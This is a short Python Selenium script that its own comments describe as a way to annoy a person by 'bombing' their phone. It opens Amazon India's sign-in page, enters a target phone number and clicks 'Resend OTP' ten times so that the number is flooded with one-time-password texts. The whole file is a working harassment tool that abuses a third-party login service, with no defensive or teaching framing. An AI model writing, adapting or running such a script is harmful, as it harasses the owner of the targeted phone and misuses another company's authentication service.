# Annoying person by Bombing their Phone by messages
# using amazon website to bomb the otp messages

from selenium import webdriver

# takeing the input phone Number

phNo = int(input("Enter the phone number"))

# opening browser

browser = webdriver.Chrome('C:\\webdrivers\\chromedriver.exe')

# opening amazon

browser.get("https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2Fgp%2Fcss%2Fhomepage.html%3Ffrom%3Dhz%26ref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&")

# giving input in field

email = browser.find_element_by_id("ap_email")
email.send_keys(phNo)
cont = browser.find_element_by_id("continue")
cont.click()
cont = browser.find_element_by_id("continue")
cont.click()
# bombing the message
n = 10
for i in range(n):
    r = browser.find_element_by_link_text("Resend OTP")
    r.click()

# closing the browser

browser.quit()